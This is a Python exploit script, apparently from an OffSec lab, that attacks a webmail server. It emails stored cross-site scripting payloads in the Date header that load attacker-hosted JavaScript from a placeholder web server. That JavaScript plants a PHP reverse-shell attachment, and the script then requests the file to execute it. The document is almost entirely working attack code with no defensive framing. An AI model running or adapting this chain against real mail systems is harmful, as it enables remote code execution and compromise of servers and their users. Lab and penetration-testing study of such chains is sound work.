import smtplib
import requests


def sendEmail(jsPayload,sender,receiver,smtpServer):
	msg = ("Date" + ":" + str(jsPayload)) + "\n"
	body = "injected Payload : %s into Header: Date" % (jsPayload) + "\n"
	msg += body
	try:
		smtpObj = smtplib.SMTP(smtpServer)
		smtpObj.sendmail(sender, receiver, msg)         
		print ("[++] Successfully sent email")
	except SMTPException:
		print ("[!] Error: unable to send email")

def executeWSFile(smtpServer):
	#  - the syntax of the path after disabling the /tmp folder is : firstLetterOfUsername/secondLetterOfUsername/fullUserName
	# the app is saving the name of the attached file as this syntax : $type . '-' . $requestParams['composeID'] . '-' . $filenameOriginal
		# - we will pass an empty value for $requestParams['composeID']
		# - $filenameOriginal : is phpRevShell.php , check the addAttachment.js file if you want to change the attached file name
	x = requests.get("http://"+str(smtpServer)+'/a/d/adminoffseclocal/application_x-php--phpRevShell.php')



def main():
	sender = "" # sender email
	receiver = "" # receiver email
	smtpServer = "" # SMTP Server IP
	globalSavePayload = '<script src="http://[yourWebServer]/globalsave.js"></script>'
	print("[+] Injecting the globalsaveAction Payload")
	sendEmail(globalSavePayload,sender,receiver,smtpServer)
	addAttachment = '<script src="http://[yourWebServer]/addAttachment.js"></script>'
	print("[+] Injecting the addAttachment Payload")
	sendEmail(addAttachment,sender,receiver,smtpServer)
	print("[+] Executing the web shell file")
	executeWSFile(smtpServer)


if __name__ == '__main__':
    main()

